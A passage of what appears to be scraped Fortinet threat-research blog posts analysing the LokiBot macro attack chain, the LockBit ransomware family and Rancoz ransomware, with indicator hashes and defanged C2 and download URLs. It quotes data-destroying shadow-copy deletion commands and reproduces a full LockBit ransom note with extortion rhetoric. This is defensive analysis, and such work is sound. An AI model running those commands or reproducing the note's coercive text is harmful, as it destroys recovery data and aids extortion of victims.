http[:]//pcwizard[.]net/yz/ftp/. Detailed information regarding the execution file can be found in the subsequent section. The second document was discovered towards the end of May. Upon analyzing the VBA script embedded within the Word document, as illustrated in Figure 4, the code is automatically executed due to its use of the “Auto_Open” and “Document_Open” functions. Various arrays are decoded within the script and saved to a temporary folder under the name “DD.inf” (Figure 5). It includes a command to create an “ema.tmp” file to store data after line 29 in the “DD.inf” file. The data is then encoded using the “ecodehex” function and saved as “des.jpg”. The script then uses rundll32 to load a DLL file with the function “maintst.” Finally, it deletes all temporary, JPG, and INF files created throughout this process. As mentioned, the VBA script creates an INF file to load a DLL. The purpose of this DLL file, named “des.jpg,” is to download an injector from the URL “https[:]//vertebromed[.]md/temp/dhssdf[.]exe” for use in a later stage. It's worth noting that the download link doesn't belong to a typical file-sharing cloud platform or the attacker's command-and-control (C2) server. Instead, it leverages the website “vertebromed.md,” which has been active since 2018. The injector file, “dhssdf.exe,” was created on May 29, 2023, as shown in Figure 6. Additionally, within the same folder, we discovered another MSIL loader named “IMG_3360_103pdf.exe,” created on May 30, 2023. Although this file isn't directly involved in the Word document attack chain, it also loads LokiBot and connects to the same C2 IP. In this section, we analyze the injector obtained from Follina (SHA256: 9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93). The injector is written in Visual Basic (VB), and we provide an overview of its basic information in Figure 7. Initially, the code extracts individual letters from predetermined strings. These letters are then combined to form an API string, subsequently mapped to the corresponding functions illustrated in Figure 8. The injector utilizes a hardcoded key to decrypt the payload, as shown in Figure 9. The decryption process is outlined in pseudo-code in Figure 10. The decrypted data is decompressed using the “RtlDecompressBufferEx” API and the parameter “COMPRESSION_FORMAT_LZNT1”. The complete procedure through Python code and the partial payload is illustrated in Figure 11. The injector incorporates various evasion techniques, including: After obtaining the payload and verifying the overall environment, the injector utilizes the “VirtualAllocEx” function to allocate memory for the subsequent execution of LokiBot. LokiBot is specifically designed to gather sensitive information from various sources, including web browsers, FTP, email, and numerous software tools installed on the compromised system. Analyzing the C2 traffic to “95[.]164[.]23[.]2/swe/h/pin[.]php” in Figure 13, we determined that the version is 0x0012 and the notable Binary ID is “ckav[.]ru”. As this version of LokiBot has remained unchanged since March, we will only highlight its major components and features. First, the MD5 hash derived from the MachineGuid is in the end pcap, “D0BECCE5760947DD9FFD80DB”. This hash serves as a mutex to ensure that multiple instances of LokiBot are not running simultaneously. It employs the “MoveFileExW” API to create a folder named “%APPDATA%\\Roaming\\576094” and a file named “47DD9F.exe” using a substring of the MD5 from MachineGuid. The file is marked as hidden by the “SetFileAttributes” function and setting the attribute to FILE_ATTRIBUTE_HIDDEN (0x2). The corresponding registry settings associated with LokiBot are depicted in Figure 14. The list of targeted software names is stored in an array, and a partial list is provided in Figure 15. LokiBot is a long-standing and widespread malware active for many years. Its functionalities have matured over time, making it easy for cybercriminals to use it to steal sensitive data from victims. The attackers behind LokiBot continually update their initial access methods, allowing their malware campaign to find more efficient ways to spread and infect systems. LokiBot exploits various vulnerabilities and employs VBA macros to launch its attacks. It also leverages a VB injector to employ several techniques to evade detection or analysis. As a result, it can bypass certain security measures and pose a significant threat to users. To protect themselves, users should exercise caution when dealing with any Office documents or unknown files, especially those that contain links to external websites. It is essential to be vigilant and avoid clicking on suspicious links or opening attachments from untrusted sources. Additionally, keeping the software and operating systems up to date with the latest security patches can help mitigate the risk of exploitation by malware. This malware is detected and blocked by FortiGuard Antivirus as: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service blocks the C2 server. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. 95[.]164[.]23[.]2 17d95ec93678b0a73e984354f55312dda9e6ae4b57a54e6d57eb59bcbbe3c38223982d2d2501cfe1eb931aa83a4d8dfe922bce06e9c327a9936a54a2c6d409ae9eaf7231579ab0cb65794043affb10ae8e4ad8f79ec108b5302da2f363b77c93da18e6dcefe5e3dac076517ac2ba3fd449b6a768d9ce120fe5fc8d6050e09c552e3e5642106ffbde1596a2335eda84e1c48de0bf4a5872f94ae5ee4f7bffda3980f4803c1ae286005a64ad790ae2d9f7e8294c6e436b7c686bd91257efbaa1e521675edce1fdabfee96407ac2683bcad0064c3117ef14a4333e564be6adf05394a23054c2241e20aec97c9b0937a37f63c30e321be01398977e13228fa980f29 LokiBot FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/lokibot-targets-microsoft-office-document-using-vulnerabilities-and-macros"
  },
  {
    "title": "Meet LockBit: The Most Prevalent Ransomware in 2022",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft Windows, Linux, ESXi, MacOSImpacted parties:Microsoft Windows, Linux, ESXi, and MacOS UsersImpact:Encrypts and exfiltrates victims’ files and demands ransom for file decryption and not to leak stolen filesSeverity level:High On June 14th, 2023, the CISA, FBI, MS-ISAC, and multiple international cyber security organizationsreleaseda joint advisory for the LockBit ransomware. This ransomware group has been active since early 2020, targeting organizations across numerous industries, including energy and government sectors. According to the advisory, LockBit was the most active ransomware in 2022. This blog provides insights into the LockBit Group's activities over the past few years. LockBit is a ransomware group that has been active since early 2020 (the active period goes back to 2019 if its predecessor “ABCD ransomware” is included in the “LockBit” family) providing a Ransomware-as-a-Service (RaaS) service to for-hire online criminals known as affiliates. The affiliates’ job is to select and infiltrate victim organizations and deploy the ransomware provided by the LockBit developer. The developer has consistently worked to improve the ransomware: LockBit 2.0 (also known as LockBit Red) was released in mid-2021, and LockBit 3.0 (also known as LockBit Black) became available in early-2022. The latest LockBit ransomware variant, “LockBit Green,” appeared in early 2023. While the LockBit ransomware initially only supported the Windows platform, the LockBit threat actor group added support for Linux/VMware/ESXi and macOS platforms in 2021 and 2023, respectively. The group also works with partners who want to sell exfiltrated data but do not want to encrypt victims' files. LockBit uses a dual extortion tactic, demanding that victims pay a ransom to recover their files and not release the stolen information to the public. LockBit is also believed to threaten Distributed Denial of Service (DDoS) attacks against victims if the demanded ransom is not paid. Due to its prevalence and popularity among cybercriminals, FortiGuard Labs has published several blogs and threat signals for LockBit ransomware: Blog Threat Signal As a RaaS, the LockBit operator offers its affiliates a variety of options for splitting the ransom fee. The ransom payment is typically split 1:4 between the LockBit operator and the affiliates. Using the features provided by the LockBit operator, its affiliates can perform a variety of activities, including: It also has “do not target” and approved “target” industry lists for file encryption and data exfiltration. Data gathered through Fortinet’s FortiRecon service supports the CISA advisory's claim that LockBit was the most active ransomware in 2022. According to our internal research, LockBit ransomware accounted for approximately 50% of the 3,298 ransomware incidents we observed in 2022. LockBit ransomware victim organizations are spread across several industries. As explained, the LockBit operator imposes \"do not attack\" rules for specific industries and countries. However, it's up to each affiliate to follow the rules. ABCD ransomware, which first appeared in September 2019, is believed to be the predecessor of LockBit ransomware. Unlike its slightly more sophisticated successor, ABCD ransomware only allows victims to contact it using email. The ransomware also deletes shadow copies by running the commandvssadmin delete shadows /all /quiet & wmic shadowcopy delete, making it difficult to recover files. FortiGuard Labs found what appears to be an even earlier version of the ABCD ransomware (SHA2: 49c0acf512146620dd26f515804324c8e4b4cc8eb8b9ab5d9c57e201241bc7ae). While this variant encrypts files, its ransom note only contains the victim's personal ID. The transition can be seen in a subsequent ABCD ransomware sample (SHA2: c8205792fbc0a5efc6b8f0f2257514990bfaa987768c4839d413dd10721e8871). This sample drops a ransom note, “Restore-My-Files.txt,” and changes the desktop wallpaper. Both refer to LockBit, but encrypted files still have a \".abcd\" extension. It's also worth noting that the LockBit operator set up a data leak site on TOR. ABCD ransomware was rebranded as LockBit in January 2020. This new LockBit variant changes the file extensions of encrypted files to \".lockbit\" instead of \".abcd\". It drops a ransom note with the same name as the ABCD ransomware, and communication was centralized on the TOR website rather than via email. This LockBit variant also replaces the desktop wallpaper on compromised machines to indicate the presence of the ransom note. The threat actor appears to have been using two different wallpapers. LockBit ransomware was updated to LockBit 2.0 (also known as LockBit Red) in mid-2021. This new variant still appends a \".lockbit\" extension to the files it encrypts but now uses a red file icon that mimics the shape of a B. LockBit 2.0 displays a ransom note on the desktop and a text file called Restore-My-Files.txt. This time, the LockBit threat actor added an alternate website that can be accessed through regular web browsers. In October 2021, the LockBit developer released a new LockBit ransomware variant designed to work on Linux and ESXi virtual machines. Like the Windows version, this new LockBit variant encrypts files on compromised devices and leaves a ransom note called \"restore-my-files.txt.\" LockBit 3.0 was released in March 2022. This variant appends a random 9-character file extension instead of the \".lockbit\" extension used by the two previous LockBit variants. It also changes the file icon of the encrypted files to a black file icon that mimics the shape of a B. LockBit 3.0 drops a ransom note labeled \"[random nine letters]_README_txt.\" The threat actor also set up more mirror TOR and regular websites in case they become inaccessible. This turned out to be the right move, as in mid-2022, reported distributed denial-of-service (DDoS) attacks took down LockBit's leak sites. The group also added 'Tox' and 'Jabber' as alternative communication methods for victims. Another noteworthy addition was an advertisement for victims, in which the LockBit group seeks insiders willing to provide internal information and access to the corporate network. It also replaces the desktop wallpaper with a reference to the dropped ransom note. The latest LockBit ransomware variant, \"LockBit Green,\" appeared in January 2023. A random 8-character extension is now added to the LockBit Green extension, and LockBit Green leaves a ransom note titled, \"!!!-Restore-My-Files-!!!.txt\". This new variant also contains a new encryption tool based on the leaked Conti source code. The comprehensive LockBit Green ransom note is reproduced below, as the ransom note dropped by the ransomware is badly formatted. ~~~ LockBit 3.0 the world’s fastest and most stable ransomware from 2019~~~ >>>>> Your data is stolen and encrypted. If you don’t pay the ransom, the data will be published on our TOR darknet sites. Keep in mind that once your data appears on our leak site, it could be bought by your competitors at any second, so don’t hesitate for a long time. The sooner you pay the ransom, the sooner your company will be safe. Tor Browser Links:hxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onionhxxp://lockbitapt[redacted][.]onion Links for normal browser: hxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitap[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.lyhxxp://lockbitapt[redacted][.]onion.ly >>>>> What guarantee is there that we won’t cheat you? We are the oldest ransomware affiliate program on the planet, nothing is more important than our reputation. We are not a politically motivated group and we want nothing more than money. If you pay, we will provide you with decryption software and destroy the stolen data. After you pay the ransom, you will quickly make even more money. Treat this situation simply as a paid training for your system administrators, because it is due to your corporate network not being properly configured that we were able to attack you. Our pentest services should be paid just like you pay the salaries of your system administrators. Get over it and pay for it. If we don’t give you a decryptor or delete your data after you pay, no one will pay us in the future. You can get more information about us on Ilon Musk’s Twitter hxxps://twitter[.]com/hashtag/[redacted]?f=live >>>>> You need to contact us and decrypt one file for free on TOR darknet sites with your personal ID Download and install Tor Browser hxxps://www.torproject[.]org/ Write to the chat room and wait for an answer, we’ll guarantee a response from you. If you need a unique ID for correspondence with us that no one will know about, tell it in the chat, we will generate a secret chat for you and give you his ID via private one-time memos service, no one can find out this ID but you. Sometimes you will have to wait some time for our reply, this is because we have a lot of work and we attack hundreds of companies around the world. Tor Browser personal link available only to you (available during a ddos attack):hxxp://lockbitsup[redacted][.]onion Tor Browser Links for chat (sometimes unavailable due to ddos attacks): hxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsupt[redacted][.]onionhxxp://lockbitsup[redacted][.]onionhxxp://lockbitsup[redacted][.]onion >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> >>>>> Your personal ID: [redacted] <<<<< >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> >>>>> Warning! Do not delete or modify encrypted files, it will lead to problems with decryption of files! >>>>> Don’t go to the police or the FBI for help and don’t tell anyone that we attacked you. They won’t help and will only make things worse for you. In 3 years not a single member of our group has been caught by the police, we are top notch hackers and we never leave a trail of crime. The police will try to prohibit you from paying the ransom in any way. The first thing they will tell you is that there is no guarantee to decrypt your files and remove stolen files, this is not true, we can do a test decryption before paying and your data will be guaranteed to be removed because it is a matter of our reputation, we make hundreds of millions of dollars and are not going to lose our revenue because of your files. It is very beneficial for the police and FBI to let everyone on the planet know about your data leak because then your state will get the fines budgeted for you due to GDPR and other similar laws. The fines will be used to fund the police and the FBI, they will eat more sweet coffee donuts and get fatter and fatter. The police and the FBI don’t care what losses you suffer as a result of our attack, and we will help you get rid of all your problems for a modest sum of money. Along with this you should know that it is not necessarily your company that has to pay the ransom and not necessarily from your bank account, it can be done by an unidentified person, such as any philanthropist who loves your company, for example, Elon Musk, so the police will not do anything to you if someone pays the ransom for you. If you’re worried that someone will trace your bank transfers, you can easily buy cryptocurrency for cash, thus leaving no digital trail that someone from your company paid our ransom. The police and FBI will not be able to stop lawsuits from your customers for leaking personal and private information. The police and FBI will not protect you from repeated attacks. Paying the ransom to us is much cheaper and more profitable than paying fines and legal fees. >>>>> What are the dangers of leaking your company’s data. First of all, you will receive fines from the government such as the GDRP and many others, you can be sued by customers of your firm for leaking information that was confidential. Your leaked data will be used by all the hackers on the planet for various unpleasant things. For example, social engineering, your employees’ personal data can be used to re-infiltrate your company. Bank details and passports can be used to create bank accounts and online wallets through which criminal money will be laundered. On another vacation trip, you will have to explain to the FBI where you got millions of dollars worth of stolen cryptocurrency transferred through your accounts on cryptocurrency exchanges. Your personal information could be used to make loans or buy appliances. You would later have to prove in court that it wasn’t you who took out the loan and pay off someone else’s loan. Your competitors may use the stolen information to steal technology or to improve their processes, your working methods, suppliers, investors, sponsors, employees, it will all be in the public domain. You won’t be happy if your competitors lure your employees to other firms offering better wages, will you? Your competitors will use your information against you. For example, look for tax violations in the financial documents or any other violations, so you have to close your firm. According to statistics, two thirds of small and medium-sized companies close within half a year after a data breach. You will have to find and fix the vulnerabilities in your network, work with the customers affected by data leaks. All of these are very costly procedures that can exceed the cost of a ransomware buyout by a factor of hundreds. It’s much easier, cheaper and faster to pay us the ransom. Well and most importantly, you will suffer a reputational loss, you have been building your company for many years, and now your reputation will be destroyed. Read more about the GDRP legislation:hxxps://en.wikipedia[.]org/wiki/General_Data_Protection_Regulationhxxps://gdpr[.]eu/what-is-gdpr/hxxps://gdpr-info[.]eu/ >>>>> Don’t go to recovery companies, they are essentially just middlemen who will make money off you and cheat you. We are well aware of cases where recovery companies tell you that the ransom price is 5 million dollars, but in fact they secretly negotiate with us for 1 million dollars, so they earn 4 million dollars from you. If you approached us directly without intermediaries you would pay 5 times less, that is 1 million dollars. >>>> Very important! For those who have cyber insurance against ransomware attacks. Insurance companies require you to keep your insurance information secret, this is to never pay the maximum amount specified in the contract or to pay nothing at all, disrupting negotiations. The insurance company will try to derail negotiations in any way they can so that they can later argue that you will be denied coverage because your insurance does not cover the ransom amount. For example your company is insured for 10 million dollars, while negotiating with your insurance agent about the ransom he will offer us the lowest possible amount, for example 100 thousand dollars, we will refuse the paltry amount and ask for example the amount of 15 million dollars, the insurance agent will never offer us the top threshold of your insurance of 10 million dollars. He will do anything to derail negotiations and refuse to pay us out completely and leave you alone with your problem. If you told us anonymously that your company was insured for $10 million and other important details regarding insurance coverage, we would not demand more than $10 million in correspondence with the insurance agent. That way you would have avoided a leak and decrypted your Information. But since the sneaky insurance agent purposely negotiates so as not to pay for the insurance claim, only the insurance company wins in this situation. To avoid all this and get the money on the insurance, be sure to inform us anonymously about the availability and terms of insurance coverage, it benefits both you and us, but it does not benefit the insurance company. Poor multimillionaire insurers will not starve and will not become poorer from the payment of the maximum amount specified in the contract, because everyone knows that the contract is more expensive than money, so let them fulfill the conditions prescribed in your insurance contract, thanks to our interaction. In April 2023, samples of LockBit for MacOS were submitted to a public file scanning service. Now that LockBit covers all major platforms (Windows, Linux, ESXi, and MacOS), LockBit developers look to stay one step ahead of competitors and further expand their influence. Evidence that they plan to take their efforts further was uncovered in late 2022 when a post offering to purchase the Raccoon Stealer source code was discovered. This addition to their arsenal would enable them to integrate known infostealer code into the LockBit ransomware. LockBit's initial access vectors include exploiting vulnerabilities and exposed Remote Access Protocol (RDP), drive-by compromise, and the use of phishing and spear-phishing emails. The LockBit group is also known to purchase existing access to targeted organizations from initial access brokers on the dark web. According to the CISA advisory, the LockBit ransomware group is reportedly exploiting the following N-day vulnerabilities: Please note that there are patches available for all of these security vulnerabilities. After LockBit affiliates gain access to victim environments, the attackers move laterally across compromised networks and exfiltrate information using various custom and dual-use tools, such as Stealbit and rclone, living-off-the-land tactics, and publicly available file-sharing services. LockBit has a data leak site on TOR where LockBit affiliates can post information about victims and their stolen data. Each victim has their own page with a countdown timer and examples of stolen information. In some cases, LockBit threat actors offer to extend the ransom deadline, download stolen information, and destroy all copies for a fee. The LockBit group also offers a file-sharing service that supports files up to 2GB. The service also has options to automatically remove uploaded files after 24 hours, seven days, or on the first download, as well as a password setting. A data leak page with search functionality is also available. The LockBit leak site was initially not as sophisticated as it is today—proof that the LockBit developer has put much effort into improving the site along with improvements to the ransomware code over the years. The below figure of the LockBit Data Leak site is courtesty ofid-ransomware. The LockBit Group has worked hard to improve its services to those who work with them. These efforts have enabled LockBit to remain at the forefront of the ransomware realm in terms of popularity and prevalence. Note that many LockBit ransomware samples exist due to the high prevalence of the ransomware over several years. Because of this, this section only contains up to 10 samples from each LockBit generation. SHA2 Malware 13849c0c923bfed5ab37224d59e2d12e3e72f97dc7f539136ae09484cbe8e5e0 ABCD ransomware 49c0acf512146620dd26f515804324c8e4b4cc8eb8b9ab5d9c57e201241bc7ae ABCD ransomware 4d0113884f70ddbbaf1ee0365602124ba91c11a76ff7bff5908d310aa9d3dfe9 ABCD ransomware 6fedf83e76d76c59c8ad0da4c5af28f23a12119779f793fd253231b5e3b00a1a ABCD ransomware 70cb1a8cb4259b72b704e81349c2ad5ac60cd1254a810ef68757f8c9409e3ea6 ABCD ransomware 9595abf24d1fa80a476c2711cd788820e9f75da015c2c8726a0a44bca0444ddf ABCD ransomware b02d57f1c4f7f233044a56fdc57c89b6cc3661479dccc3b4cfa1f6f9d20cd893 ABCD ransomware c8205792fbc0a5efc6b8f0f2257514990bfaa987768c4839d413dd10721e8871 ABCD ransomware cff048ed06cf900170562906bded4a8fd166185a1b785f5ece0e2a842cf52d46 ABCD ransomware ec88f821d22e5553afb94b4834f91ecdedeb27d9ebfd882a7d8f33b5f12ac38d ABCD ransomware 0a937d4fe8aa6cb947b95841c490d73e452a3cafcd92645afc353006786aba76 LockBit ransomware 0e66029132a885143b87b1e49e32663a52737bbff4ab96186e9e5e829aa2915f LockBit ransomware 0f178bc093b6b9d25924a85d9a7dde64592215599733e83e3bbc6df219564335 LockBit ransomware 0f5d71496ab540c3395cfc024778a7ac5c6b5418f165cc753ea2b2befbd42d51 LockBit ransomware 15a7d528587ffc860f038bb5be5e90b79060fbba5948766d9f8aa46381ccde8a LockBit ransomware 286bffaa9c81abfb938fe65be198770c38115cdec95865a241f913769e9bfd3f LockBit ransomware 410c884d883ebe2172507b5eadd10bc8a2ae2564ba0d33b1e84e5f3c22bd3677 LockBit ransomware 76a77def28acf51b2b7cdcbfaa182fe5726dd3f9e891682a4efc3226640b9c78 LockBit ransomware e3f236e4aeb73f8f8f0caebe46f53abbb2f71fa4b266a34ab50e01933709e877 LockBit ransomware faa3453ceb1bd4e5b0b10171eaa908e56e7275173178010fcc323fdea67a6869 LockBit ransomware 3f8ab65e3733ca62001500f7fcb83057869c869345affa4701fbd4d7207e6899 LockBit 2.0 4b09da2f1d94bc0fd2fd8be7b723172349e03e71117dfe483da06ac207f3e124 LockBit 2.0 5b5f3fc7bd943bd6bb575406018bf6401c6e6956ed92d54f634ba754e993d2d2 LockBit 2.0 897b23cc1af331a972da64e298163fbe0f1fd4d6bd983d452a889c1d285a1a27 LockBit 2.0 f35ba7686462a868a90bb8d9567e42e34064f91f54aeb5ed74b0d0b0e19badac LockBit 2.0 059399f01e9bd588b42dbaf61c7a3b5aa6a48ba15a3ed13bdca7ce13a71a8526 LockBit 2.0 161c951e6d2e8d07571fc451a28a9feafb672c1f05586768f8178f33a9d74efb LockBit 2.0 329e77a8a304e38ce4c4ed8906f9a7594377a3da64505fd1935b58acfc9ab4b9 LockBit 2.0 c6d3ff77910e991c6d782a3961c58ef69643c7d000b9c2d31e19904f2020dc6c LockBit 2.0 ef870afba5951592f7d2964613a7819b9c92c7c6f6bd5c6fd2aa46978deaca34 LockBit 2.0 6aee637b88a06f7cc4813b47719717a64e39047f33617930a6cd11fc25fbca0a LockBit 3.0 7d7357e4963c7d6f087a11e22d683cacf614dc7f269c2907bbb12ae30f2b007d LockBit 3.0 97320395d90b28ad3d5cd0ed0416b0fe379cc0cc3d65f0b27e50db4da5902ec2 LockBit 3.0 cb537a122fb0531f14c76dfd0a87cc304c26a9ab01aec46a5fd17f268ac80854 LockBit 3.0 f1ecb57988caf26216683b1314607f06f8bf051632ff7ba73f17c2dc9b3aafcc LockBit 3.0 072d0633006eeafc77c0b0144fdac84a57fa1e4f8b96d9aa33d377bd789bc533 LockBit 3.0 12b6fead37cca9d8ca4c00c2a9d56c0a402e760ab309356f078587acb7f33396 LockBit 3.0 58729cd09a74e3f69d26653b71412f9c9285ffaba52a9beb5b6d634014c98e1a LockBit 3.0 aa0d0c6dcb69623ac4cfd87ecd991d8fe55807cec6628b92ba698844a24ba58e LockBit 3.0 f02cf38d417fc6e3d5f9fc05ebf49ca37e6106ffc62ce21145888338598e0c70 LockBit 3.0 102679330f1e2cbf41885935ceeb2ab6596dae82925deec1aff3d90277ef6c8c LockBit Green 32eb4b7a4d612fac62e93003811e88fbc01b64281942c25f2af2a0c63cdbe7fa LockBit Green 5c5c5b25b51450a050f4b91cd2705c8242b0cfc1a0eaeb4149354dbb07979b83 LockBit Green 7509761560866a2f7496eb113954ae221f31bc908ffcbacad52b61346880d9f3 LockBit Green 924ec909e74a1d973d607e3ba1105a17e4337bd9a1c59ed5f9d3b4c25478fe11 LockBit Green ac49a9ecd0932faea3659d34818a8ed4c48f40967c2f0988eeda7eb089ad93ca LockBit Green fc8668f6097560f79cea17cd60b868db581e51644b84f5ad71ba85c00f956225 LockBit Green ffa0420c10f3d0ffd92db0091304f6ed60a267f747f4420191b5bfe7f4a513a9 LockBit Green 472836ed669d3927d50055e801048696375b37fce03b2f046e3e1039fb88e048 LockBit for Linux dc3d08480f5e18062a0643f9c4319e5c3f55a2e7e93cd8eddd5e0c02634df7cf LockBit for Linux 052716d193fc11c2f0deb67e35e580db335368d53cdd486f9cb1598c7021be8e LockBit for Linux 2f31962c5e89917f6df87babd836840042b7ea7ea01763cff1bf645878a2ab47 LockBit for Linux 719e1e9289c78ed9ee5000bffdd26bc2a4473f966091e321919e333d81e8b1e6 LockBit for Linux 624188b7b839afe83d2cc6593448b73e94c40085671f967846ac3901c9f75249 LockBit for Linux 6a6c3a6eec55a1ec47badd05d6cfe6b4f8680c7f7bc6ee571c330a5b1ffdbc3a LockBit for Linux a0b36376ab6c54540d10e5d549049622096d121abec6f760e0452a535c1675f3 LockBit for Linux 3e4bbd21756ae30c24ff7d6942656be024139f8180b7bddd4e5c62a9dfbd8c79 LockBit for MacOS 0be6f1e927f973df35dad6fc661048236d46879ad59f824233d757ec6e722bde LockBit for MacOS FortiGuard Labs has the following AV signatures in place for the LockBit samples in the IOC section: Additionally, the following AV signatures are available for LockBit samples: FortiGuard Labs has put the following IPS signatures in place for the vulnerabilities reportedly exploited by LockBit ransomware threat actors: Note: For more information on CVE-2018-13379, see the blog “Prioritizing Patching is Essential for Network Integrity.” Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is generally delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREENSE training:NSE 1 – Information Security Awarenessincludes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks and can be easily added to internal training programs. Organizations also need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Organizations are encouraged to implement cloud-based security solutions, such asSASE, to protect off-network devices, advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack, andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context. These solutions are proven to minimize risk and reduce the impact of a successful ransomware attack. By operating these solutions as part of the industry's only fully integratedSecurity Fabric, organizations can also take advantage of native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings that can be deployed independently or as part of the Fortinet Security Fabric. These services are powered by advanced AI-enabled technologies and our global FortiGuard team of seasoned cybersecurity experts. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aU.S. Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. And ourIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard AI-powered securityservices portfolio. ransomware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/lockbit-most-prevalent-ransomware"
  },
  {
    "title": "Ransomware Roundup - Rancoz",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Rancoz ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High It's only been a few months since the Rancoz ransomware first came to the public's attention. However, it's important to raise awareness of this ransomware variant, as the most recent victim on their data leak site on TOR dates back just a few weeks to mid-June. The first recorded Rancoz victim, according to their TOR site, occurred in November of 2022. The Rancoz modus operandi is similar to other groups, which is to encrypt files on compromised machines, steal information, and extort money from victims. Information on the infection vector used by the Rancoz ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. At the time of this research, there is no indication that Rancoz is widespread. Once executed, Rancoz ransomware enumerates all local drives and encrypts files unless the attackers specify otherwise. It adds a “.rec_rans” extension to the files it encrypts and leaves a ransom note labeled “HOW_TO_RECOVERY_FILES.txt” [sic]. Furthermore, the ransomware deletes shadow copies by running the command “/c vssadmin.exe Delete Shadows /All /Quiet”, which makes file recovery difficult. It then deletes the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\\” while resetting the registry “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\\”. Removal of those registry keys may prevent victims from being able to connect to remote servers for file recovery. The ransom note contains the URL of the Rancoz data leak site and the attacker’s contact email address. The ransomware also replaces the desktop wallpaper, prompting victims to read the ransom note. At the time of our investigation, the Rancoz ransomware group had three victims in different industries listed on their date leak site. Two victims are in the U.S., and the other is in Canada. As seen in the below screenshot, the threat actor stole a significant amount of information and exposed that data to the public. Note that some ransomware groups remove company listings from data leak sites after the ransom is paid. Therefore, it is possible that there may be additional victims of the Rancoz ransomware. While submission locations are not a strong indicator of infection, the Rancoz ransomware samples have been submitted to a public file scanning service from the United States, India, France, and Lithuania. What's more interesting is that these submissions were made from early May to late June, which may indicate that the threat actor is still distributing the same Rancoz ransomware sample. Based on the Rancoz samples, FortiGuard Labs has determined that the Buddy ransomware (SHA2: d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588) may be related to the same attacker or malware developer. Both samples were compiled on the same date and time, “2023-02-19 09:01:20 UTC”. And while this ransomware variant adds a different file extension, \".buddyransome\", to the files it encrypts, it drops a ransom note with the same name (and grammatical error) as the Rancoz ransomware. d5e632836622d52c91e4ef059e9124184fceaf85783278880797f788ce141588 also replaces the desktop wallpaper, like the Rancoz ransomware. And while the contents are different, the opening sentence is the same. We also located another ransomware sample (SHA2: da0332ace0a9ccdc43de66556adb98947e64ebdf8b3289e2291016215d8c5b4c) that may be related to the same attacker. The ransomware dropped by this sample is very similar to that of Rancoz. One significant difference is that the Rancoz ransom note links to a TOR site 